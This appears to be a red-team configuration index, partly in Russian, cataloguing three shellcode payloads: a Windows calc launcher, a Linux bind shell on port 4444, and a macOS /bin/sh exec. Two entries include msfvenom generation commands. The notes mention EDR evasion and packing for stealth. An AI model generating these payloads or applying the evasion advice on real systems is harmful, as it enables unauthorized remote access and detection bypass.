# Shellcode Reference Index (v20-industrial)
# Модуль shellcodes используется в рамках генерации низкоуровневых полезных нагрузок
# Поддержка архитектур: x86, x64, ARM, MIPS, PowerPC
# Цель: унифицированный реестр с идентификаторами, метаданными и кратким содержанием payload'ов

[metadata]
version = 20.0
maintainer = TeslaAI RedOps
verified_by = ["agent-001", "agent-002", ..., "agent-020"]
meta_generals = ["metageneral-1", "metageneral-2", "metageneral-3"]

[shellcode_001]
id = win_exec_calc_x86
arch = x86
platform = Windows
description = Launches calc.exe using WinExec API
length = 160 bytes
format = hex
source = msfvenom -p windows/exec CMD=calc.exe -f hex

[shellcode_002]
id = linux_bind_shell_x64
arch = x64
platform = Linux
description = Opens TCP bind shell on port 4444
length = 100 bytes
format = hex
source = msfvenom -p linux/x64/shell_bind_tcp LPORT=4444 -f hex

[shellcode_003]
id = macos_exec_x64
arch = x64
platform = macOS
description = Executes /bin/sh on macOS
length = 120 bytes
format = hex
source = custom compiled ASM payload

[reserved_ids]
reserved = [
  "shellcode_004" to "shellcode_1000"
]

[notes]
- Все shellcode проходят проверку на null-byte, EDR-детект и sandbox-наблюдаемость
- Генераторы хранятся в ../generators/
- Используйте вместе с encryption_packing/ для стелс-режима

[legal_disclaimer]
Use only in authorized environments with proper permissions. Unauthorized use is illegal and unethical.
